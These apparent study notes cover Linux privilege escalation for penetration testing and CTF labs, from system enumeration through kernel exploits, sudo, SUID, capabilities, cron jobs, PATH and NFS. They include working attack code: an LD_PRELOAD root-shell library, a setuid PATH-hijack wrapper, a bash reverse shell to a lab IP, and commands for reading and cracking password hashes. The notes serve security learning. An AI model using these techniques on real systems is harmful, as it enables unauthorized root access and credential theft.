###	hostname

`
The hostname command will return the hostname of the target machine. Although this value can easily be changed or have a relatively meaningless string (e.g. Ubuntu-3487340239), in some cases, it can provide information about the target system’s role within the corporate network (e.g. SQL-PROD-01 for a production SQL server).
`

###	uname -a
`
Will print system information giving us additional detail about the kernel used by the system. This will be useful when searching for any potential kernel vulnerabilities that could lead to privilege escalation.
`

###	/proc/version
```
The proc filesystem (procfs) provides information about the target system processes. You will find proc on many different Linux flavours, making it an essential tool to have in your arsenal.

Looking at /proc/version may give you information on the kernel version and additional data such as whether a compiler (e.g. GCC) is installed. 
```

###	/etc/issue
```
Systems can also be identified by looking at the /etc/issue file. This file usually contains some information about the operating system but can easily be customized or changes. While on the subject, any file containing system information can be customized or changed. For a clearer understanding of the system, it is always good to look at all of these.
```

###	/etc/passwd
```
Reading the /etc/passwd file can be an easy way to discover users on the system.
```

###	Privilege Escalation: Kernel Exploits 
```
The Kernel exploit methodology is simple;

    Identify the kernel version
    Search and find an exploit code for the kernel version of the target system
    Run the exploit 

Although it looks simple, please remember that a failed kernel exploit can lead to a system crash. Make sure this potential outcome is acceptable within the scope of your penetration testing engagement before attempting a kernel exploit.


Research sources:

    Based on your findings, you can use Google to search for an existing exploit code.
    Sources such as https://www.linuxkernelcves.com/cves can also be useful.
    Another alternative would be to use a script like LES (Linux Exploit Suggester) but remember that these tools can generate false positives (report a kernel vulnerability that does not affect the target system) or false negatives (not report any kernel vulnerabilities although the kernel is vulnerable).


Hints/Notes:

    Being too specific about the kernel version when searching for exploits on Google, Exploit-db, or searchsploit
    Be sure you understand how the exploit code works BEFORE you launch it. Some exploit codes can make changes on the operating system that would make them unsecured in further use or make irreversible changes to the system, creating problems later. Of course, these may not be great concerns within a lab or CTF environment, but these are absolute no-nos during a real penetration testing engagement.
    Some exploits may require further interaction once they are run. Read all comments and instructions provided with the exploit code.
    You can transfer the exploit code from your machine to the target system using the SimpleHTTPServer Python module and wget respectively. 
```

###	Privilege Escalation: Sudo 
[GTFO Bins](https://gtfobins.github.io/)
```c
Any user can check its current situation related to root privileges using the sudo '-l' command. 

'Leverage application' functions

Some applications will not have a known exploit within this context. Such an application you may see is the Apache2 server.

In this case, we can use a "hack" to leak information leveraging a function of the application. As you can see below, Apache2 has an option that supports loading alternative configuration files (-f : specify an alternate ServerConfigFile).


Loading the /etc/shadow file using this option will result in an error message that includes the first line of the /etc/shadow file.

'Leverage LD_PRELOAD'

On some systems, you may see the LD_PRELOAD environment option.


LD_PRELOAD is a function that allows any program to use shared libraries. This blog post will give you an idea about the capabilities of LD_PRELOAD. If the "env_keep" option is enabled we can generate a shared library which will be loaded and executed before the program is run. Please note the LD_PRELOAD option will be ignored if the real user ID is different from the effective user ID.

The steps of this privilege escalation vector can be summarized as follows;

    Check for LD_PRELOAD (with the env_keep option)
    Write a simple C code compiled as a share object (.so extension) file
    Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file

The C code will simply spawn a root shell and can be written as follows;

#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;

'gcc -fPIC -shared -o shell.so shell.c -nostartfiles'


We can now use this shared object file when launching any program our user can run with sudo. In our case, Apache2, find, or almost any of the programs we can run with sudo can be used.

We need to run the program by specifying the LD_PRELOAD option, as follows;

'sudo LD_PRELOAD=/home/user/ldpreload/shell.so find'

This will result in a shell spawn with root privileges. 
```

###	 Privilege Escalation: SUID 
```
Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. By now, you know that files can have read, write, and execute permissions. These are given to users within their privilege levels. This changes with SUID (Set-user Identification) and SGID (Set-group Identification). These allow files to be executed with the permission level of the file owner or the group owner, respectively.

You will notice these files have an “s” bit set showing their special permission level.

find / -type f -perm -04000 -ls 2>/dev/null will list files that have SUID or SGID bits set.

two basic options for privilege escalation: reading the /etc/shadow file or adding our user to /etc/passwd.
```

####	The unshadow tool’s usage can be seen below;
`unshadow passwd.txt shadow.txt > passwords.txt`

###	Privilege Escalation: Capabilities 
```
Another method system administrators can use to increase the privilege level of a process or binary is “Capabilities”. Capabilities help manage privileges at a more granular level. For example, if the SOC analyst needs to use a tool that needs to initiate socket connections, a regular user would not be able to do that. If the system administrator does not want to give this user higher privileges, they can change the capabilities of the binary. As a result, the binary would get through its task without needing a higher privilege user.
The capabilities man page provides detailed information on its usage and options.

We can use the 'getcap' tool to list enabled capabilities.

```
`getcap -r / 2>/dev/null
`

###	Privilege Escalation: Cron Jobs 
```
Each user on the system have their crontab file and can run specific tasks whether they are logged in or not. As you can expect, our goal will be to find a cron job set by root and have it run our script, ideally a shell.

Any user can read the file keeping system-wide cron jobs under /etc/crontab
```
`bash -i >& /dev/tcp/10.17.53.134/7777 0>&1`

###	Privilege Escalation: PATH 
    What folders are located under $PATH
    Does your current user have write privileges for any of these folders?
    Can you modify $PATH?
    Is there a script/application you can start that will be affected by this vulnerability?

```c
#include<unistd.h>
void main()
{
	setuid(0);
	setgid(0);
	system("thm")
}
```

`find / -writable 2>/dev/null`

`The folder that will be easier to write to is probably /tmp. At this point because /tmp is not present in PATH so we will need to add it. As we can see below, the “export PATH=/tmp:$PATH” command accomplishes this. `

```bash
echo /bin/bash > thm
chmod 777 thm
ls -l thm


./("script name")
```
###	Privilege Escalation: NFS 
	Privilege escalation vectors are not confined to internal access. Shared folders and remote management interfaces such as SSH and Telnet can also help you gain root access on the target system. Some cases will also require using both vectors, e.g. finding a root SSH private key on the target system and connecting via SSH with root privileges instead of trying to increase your current user’s privilege level.

	Another vector that is more relevant to CTFs and exams is a misconfigured network shell. This vector can sometimes be seen during penetration testing engagements when a network backup system is present.

	NFS (Network File Sharing) configuration is kept in the /etc/exports file. This file is created during the NFS server installation and can usually be read by users.

	The critical element for this privilege escalation vector is the “no_root_squash”

`showmount -e <ip>`

`mount -o rw <targetnfs> <localmachinetomount>`

`gcc <filename> -o <outputfile> -w`
